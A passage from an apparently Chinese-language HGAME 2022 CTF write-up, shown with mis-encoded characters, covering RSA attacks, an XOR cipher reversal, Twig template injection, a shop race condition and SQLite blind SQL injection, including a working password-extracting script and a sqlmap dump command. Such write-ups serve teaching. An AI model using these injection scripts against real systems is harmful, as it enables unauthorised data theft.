3</code></pre><p>è¿™å°±ç›¸å½“äºæœ‰äº†encï¼Œå¸¦åˆ°å‰ä¸€ä¸ªé¢˜çš„ä»£ç é‡Œå¾—åˆ°</p><p>hgame{RsA@hAS!a&amp;VArIETY?of.</p><p><strong>ç¬¬äºŒæ®µ</strong></p><p>e=7åƒä½åŠ å¯†æŒ‡æ•°åˆ†è§£æ”»å‡»ï¼Œç›´æ¥å¼€ä¸ƒæ¬¡æ–¹</p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2se &#x3D; 7# è¯»å…¥ n, å¯†æ–‡n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625print(&#39;n&#x3D;&#39;, n)print(&#39;c&#x3D;&#39;, c)result &#x3D; gmpy2.iroot(c, 7)print(&#39;  [-]The c has cubic root?&#39;, result[1])if result[1]:    print(&#39;  [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0]))</code></pre><p>å¾—åˆ°m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141</p><p>è½¬å­—ç¬¦ä¸²çš„ä¸ºAttacK^mEThodS^whAT:other!A</p><p><strong>ç¬¬ä¸‰æ®µ</strong></p><p>å…±æ¨¡æ”»å‡»</p><pre class="language-none"><code class="language-none">from gmpy2 import *from libnum import n2sn &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729e1 &#x3D; 2519901323e2 &#x3D; 3676335737s &#x3D; gcdext(e1, e2)s1 &#x3D; s[1]s2 &#x3D; -s[2]c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861e2 &#x3D; 3676335737c2 &#x3D; invert(c2, n)m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % nprint(m)print(n2s(int(m)))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129192505430.png" alt="image-20220129192505430"></p><p>æœ€ç»ˆflag</p><pre class="language-none"><code class="language-none">hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;</code></pre><h1 id="ç¬¬ä¸‰å‘¨wp"><a href="#ç¬¬ä¸‰å‘¨wp" class="headerlink" title="ç¬¬ä¸‰å‘¨wp"></a>ç¬¬ä¸‰å‘¨wp</h1><h2 id="CRYPTO-2"><a href="#CRYPTO-2" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>è¿™å‘¨å¯†ç æ¯”ä¸Šå‘¨è¦ç®€å•</p><h3 id="Multi-Prime-RSA"><a href="#Multi-Prime-RSA" class="headerlink" title="Multi Prime RSA"></a>Multi Prime RSA</h3><p>åŠ å¯†è„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204171309886.png" alt="image-20220204171309886"></p><p>ç»™äº†è¿™é™¤äº†flagå…¶ä»–çš„å˜é‡éƒ½ç»™äº†</p><pre class="language-none"><code class="language-none">p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919e &#x3D; 65537c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</code></pre><p>ç›´æ¥æ‰¾ä¸ªrsaçš„è§£å¯†è„šæœ¬å¸¦è¿›å»å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204123448819.png" alt="image-20220204123448819"></p><h3 id="RSA-Attack-3"><a href="#RSA-Attack-3" class="headerlink" title="RSA Attack 3"></a>RSA Attack 3</h3><p>åŠ å¯†è„šæœ¬</p><pre class="language-none"><code class="language-none">from Crypto.Util.number import getPrimefrom gmpy2 import invertfrom libnum import s2nfrom secret import flagp &#x3D; getPrime(2048)q &#x3D; getPrime(2048)n &#x3D; p * qd &#x3D; getPrime(64)e &#x3D; invert(d, (p - 1) * (q - 1))c &#x3D; pow(s2n(flag), e, n)print(f&quot;n &#x3D; &#123;n&#125;&quot;)print(f&quot;e &#x3D; &#123;e&#125;&quot;)print(f&quot;c &#x3D; &#123;c&#125;&quot;)</code></pre><p>åªç»™äº†necï¼Œæƒ³è¦å¾—åˆ°æ˜æ–‡è¿˜è¦æœ‰dï¼Œè¦æ±‚då°±è¦æŒ‡å®špqã€‚</p><p>åˆ©ç”¨rsactftoolæ±‚å…¬é’¥ç§é’¥æ–‡ä»¶ç„¶åå¾—åˆ°pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172702618.png" alt="image-20220204172702618"></p><p>å¾—åˆ°å…¬é’¥</p><pre class="language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7w&#x3D;&#x3D;-----END PUBLIC KEY-----</code></pre><p>å†ç”¨å…¬é’¥æ±‚ç§é’¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172751433.png" alt="image-20220204172751433"></p><p>å¾—åˆ°ç§é’¥</p><pre class="language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCotra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enIFkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmkaUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoNduZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6FlIDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1XDzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiDfG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8CCQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hVCAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3LBeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3vgPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92flUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28-----END RSA PRIVATE KEY-----</code></pre><p>å†åˆ©ç”¨ç§é’¥æ±‚pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172904395.png" alt="image-20220204172904395"></p><p>å¾—åˆ°pqä¹‹åæ‰¾ä¸ªrsaè„šæœ¬å¸¦è¿›å»å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172948397.png" alt="image-20220204172948397"></p><h3 id="Block-Cipher"><a href="#Block-Cipher" class="headerlink" title="Block Cipher"></a>Block Cipher</h3><p>åŠ å¯†è„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173328550.png" alt="image-20220204173328550"></p><p>ç»™äº†ä¸‰ä¸ªå€¼</p><p>iv = b&#39;Up\x14\x98r\x14%\xb9&#39;</p><p>key = b&#39;\r\xe8\xb86\x9c33^&#39;</p><p>parts = [b&#39;0\xff\xcd\xc3\x8b\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]</p><p>åŠ å¯†çš„é€»è¾‘å¤§è‡´æ˜¯å°†flagæ¯å…«ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œä¸å¤Ÿçš„åœ¨æœ«å°¾åŠ ä¸Šchr(len(è¯¥æ®µé•¿åº¦))é‡å¤ä¸€å®šæ¬¡æ•°å‡‘å¤Ÿå…«ä¸ªå­—ç¬¦,åŒæ—¶æ„é€ æœ‰å…«ç»„æ•°æ®çš„ivå’Œkeyå˜é‡ï¼Œå¹¶ä¸flagåˆ†æˆçš„ç»„è¿›è¡Œä¸€æ¬¡å¼‚æˆ–æ“ä½œï¼Œå°†å¼‚æˆ–æ“ä½œåçš„å†…å®¹ä½œä¸ºä¸‹ä¸€æ¬¡å¼‚æˆ–æ“ä½œçš„ivã€‚åŒæ—¶å°†å¼‚æˆ–åçš„å†…å®¹æ”¾å…¥resultsåˆ—è¡¨ä¸­</p><p>å…¶ä¸­è¿”å›å€¼çš„å†…å®¹éƒ½æ˜¯å¯è¿­ä»£ç±»å‹ï¼Œæ‰€ä»¥è¦åˆ©ç”¨forå¾ªç¯æ‰èƒ½è¯»å‡ºé‡Œé¢çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175512017.png" alt="image-20220204175512017"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173726545.png" alt="image-20220204173726545"></p><p>å…«ä¸ªä¸€ç»„çš„æ•°å­—</p><p>ä¹Ÿå°±ç›¸å½“äºç¬¬ä¸€ç»„48 = 85^13^ord(flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦)å³ord(&#39;h&#39;)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175945549.png" alt="image-20220204175945549"></p><p>ç»è¿‡æµ‹è¯•è¿™ä¸ªä¹Ÿèƒ½é€†æ¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180050478.png" alt="image-20220204180050478"></p><p>æ‰€ä»¥åªè¦æ ¹æ®åŠ å¯†è„šæœ¬å°†flagå˜ä¸ºç»™çš„partsé‡Œçš„å†…å®¹å°±èƒ½åˆ†æ®µè§£å¯†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180213786.png" alt="image-20220204180213786"></p><p>è´´ä¸€ä¸‹å…¶ä»–å¸ˆå‚…å†™çš„è§£ç è„šæœ¬ï¼ˆæˆ‘æ˜¯èœb</p><pre class="language-python" data-language="python"><code class="language-python">import operatorimport gmpy2from Crypto.Util.number import long_to_bytesimport randomfrom functools import reduceiv &#x3D; b&#39;Up\x14\x98r\x14%\xb9&#39;key &#x3D; b&#39;\r\xe8\xb86\x9c33^&#39;parts &#x3D; [b&#39;0\xff\xcd\xc3\x8b\\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]results &#x3D; []def xor(a, b):    assert len(a) &#x3D;&#x3D; len(b)    return bytes(map(operator.xor, a, b))def decrypt():    for index, part in enumerate(parts):        results.append(reduce(xor, [part, iv if index &#x3D;&#x3D; 0 else parts[index - 1], key]))decrypt()print(results)</code></pre><h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>çœ‹ä¸€ä¸‹è¿™ä¸ªè·¯å¾„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190318143.png" alt="image-20220204190318143"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190356431.png" alt="image-20220204190356431"></p><p>å†ç»“åˆ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190428652.png" alt="image-20220204190428652"></p><p>çŒœæµ‹æ˜¯twigçš„æ¨¡æ¿æ³¨å…¥</p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190615656.png" alt="image-20220204190615656"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190633423.png" alt="image-20220204190633423"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190655380.png" alt="image-20220204190655380"></p><p>catåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨tacçœ‹ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190732690.png" alt="image-20220204190732690"></p><p>æŠŠå«æœ‰hgameå†…å®¹çš„å­—ç¬¦ä¸²ä¹Ÿè¿‡æ»¤äº†ï¼Œå°è¯•é€†å‘è¾“å‡º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190810214.png" alt="image-20220204190810214"></p><p>æˆåŠŸï¼Œæ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190827635.png" alt="image-20220204190827635"></p><h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>çœ‹è¿™ä¸ªæè¿°å°±åƒæ”¯ä»˜é€»è¾‘æ¼æ´</p><p>å…ˆéšä¾¿æ³¨å†Œä¸ªè´¦æˆ·è¿›å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180704485.png" alt="image-20220204180704485"></p><p>çœ‹çœ‹å•†åº—ï¼Œflagè¦ä¸€ä¸‡ï¼Œæˆ‘ä»¬åªæœ‰ä¹åƒä¹ç™¾ä¹åä¹</p><p>å…ˆä¹°ä¸ªå¾½ç« è¯•è¯•</p><p>å‘ç°è´­ä¹°çš„å¾½ç« å¦‚æœåˆ é™¤ï¼Œè´­ä¹°èŠ±è´¹çš„é’±ä¹Ÿä¼šè¿”è¿˜ï¼Œæ‰€ä»¥è¯•è¯•å†å¼€ä¸€ä¸ªç½‘é¡µï¼ŒåŒæ—¶åˆ é™¤å¾½ç« </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180850691.png" alt="image-20220204180850691"></p><p>æˆåŠŸå¤§äºä¸€ä¸‡äº†ï¼Œä¹°ä¸ªflag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180917539.png" alt="image-20220204180917539"></p><h3 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe*"></a>LoginMe*</h3><p>sqlæ³¨å…¥ï¼Œç»™çš„hintå¾ˆæ˜æ˜¾å°±æ˜¯sqlè¯­å¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212223934416.png" alt="image-20220212223934416"></p><p>ä½†æ˜¯å› ä¸ºå¹³å¸¸çš„é¢˜éƒ½æ˜¯mysqlçš„ï¼Œè¿™ä¸ªæ˜¯ sqliteï¼Œæ‰€ä»¥åªè¯•å‡ºäº†æ³¨å…¥ç‚¹ï¼Œå…¶ä»–çš„å°±æ²¡æ³¨</p><p>sqliteå› ä¸ºå…¶æ¯”è¾ƒç®€æ˜“æ¯ä¸ªdbæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œæ‰€ä»¥ä¸å­˜åœ¨information_schemaæ•°æ®åº“ï¼Œä½†å­˜åœ¨ç±»ä¼¼ä½œç”¨çš„è¡¨sqlite_masterã€‚</p><p>è¯¥è¡¨è®°å½•äº†è¯¥åº“ä¸‹çš„æ‰€æœ‰è¡¨ï¼Œç´¢å¼•ï¼Œè¡¨çš„åˆ›å»ºsqlç­‰æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤è¯»å–æ•°æ®ï¼Œå¸¸è§è¯­å¥å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">1 è¯»å–è¡¨åï¼šselect group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39;2 è¯»å–å­—æ®µï¼šselect group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;è¡¨å&#39;</code></pre><p>çœ‹çœ‹è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232736925.png" alt="image-20220212232736925"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232755661.png" alt="image-20220212232755661"></p><p>è¯æ˜ç¡®å®èƒ½æ³¨ï¼Œå¯ä»¥å†™ä¸ªè„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212233244464.png" alt="image-20220212233244464"></p><p>åæ­£æœ€åè¡¨åæ˜¯uuussseeerrrsss</p><p>åè¾¹çš„è„šæœ¬ï¼ˆæ‰‹æ³¨å¤ªæ…¢äº†</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot;date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125;flag &#x3D; &#39;&#39;for i in range(1,200):    for j in range(31,127):        #åˆ—å        #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        #è¯»æ•°æ®        date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        r &#x3D; requests.post(url,json&#x3D;date);        response &#x3D; r.text        if &#39;success&#39; in response:            flag +&#x3D;chr(j)            print(flag)            breakprint(flag)</code></pre><p>æ‹¿åˆ°å¯†ç ä¹‹åç™»å½•å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213003003539.png" alt="image-20220213003003539"></p><p>ä¹Ÿå¯ä»¥ç”¨sqlmapç›´æ¥è·‘</p><p>bpæŠ“åŒ…ä¹‹åä¿å­˜åˆ°æœ¬åœ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004158890.png" alt="image-20220213004158890"></p><p>ç„¶åä¸Šsqlmap</p><p>python sqlmap.py -r &quot;D:\Desktop\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004815203.png" alt="image-20220213004815203"></p><h1 id="ç¬¬å››å‘¨wp"><a href="#ç¬¬å››å‘¨wp" class="headerlink" 